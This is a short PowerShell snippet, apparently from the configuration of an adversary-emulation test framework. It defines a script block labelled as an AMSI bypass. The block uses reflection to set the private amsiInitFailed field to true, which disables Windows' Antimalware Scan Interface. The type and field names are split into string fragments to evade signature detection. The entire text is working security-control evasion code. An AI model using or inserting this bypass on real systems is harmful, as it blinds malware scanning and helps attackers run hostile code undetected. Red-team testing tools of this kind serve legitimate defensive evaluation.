$artConfig | Add-Member -Force -NotePropertyMembers @{
  # amsi bypass script block (applies to Windows only)
   absb                       = {
    $a = "System.Management.Automation.Amsi" + "Utils"
    $b = "amsiInit" + "Failed"
    $num1 = [REF].Assembly.GetType($a).GetField($b, 'NonPublic,Static')
    $num1.SetValue($null, $true)
  }
}
